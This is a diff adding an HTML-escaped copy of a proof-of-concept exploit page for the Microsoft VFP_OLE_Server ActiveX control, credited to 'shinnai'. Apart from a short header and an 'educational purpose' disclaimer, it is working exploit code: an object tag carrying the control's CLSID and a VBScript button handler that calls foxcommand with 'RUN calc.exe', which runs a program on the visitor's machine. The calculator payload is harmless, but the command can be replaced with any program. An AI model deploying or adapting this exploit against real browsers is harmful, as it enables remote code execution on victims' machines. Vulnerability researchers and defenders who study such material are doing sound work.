@@ -1,0 +1,29 @@
+&lt;pre&gt;
+&lt;code&gt;&lt;span style=&quot;font: 10pt Courier New;&quot;&gt;&lt;span class=&quot;general1-symbol&quot;&gt;&lt;body bgcolor=&quot;#E0E0E0&quot;&gt;-----------------------------------------------------------------------------
+ &lt;b&gt;Microsoft VFP_OLE_Server Remote Command Execution&lt;/b&gt;
+ url: http://www.microsoft.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ &lt;b&gt;&lt;font color=&#039;red&#039;&gt;This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.&lt;/font&gt;&lt;/b&gt;
+
+ Not much more to say than using &quot;foxcommand()&quot; function, you can
+ run applications passed as argument.
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+-----------------------------------------------------------------------------
+&lt;object classid=&#039;clsid:A7CD2320-6117-11D7-8096-0050042A4CD2&#039; id=&#039;test&#039;&gt;&lt;/object&gt;
+
+&lt;input language=VBScript onclick=tryMe() type=button value=&#039;Click here to start the test&#039;&gt;
+
+&lt;script language=&#039;vbscript&#039;&gt;
+  Sub tryMe
+   test.foxcommand &quot;RUN calc.exe&quot;
+  End Sub
+&lt;/script&gt;
+
+&lt;/span&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
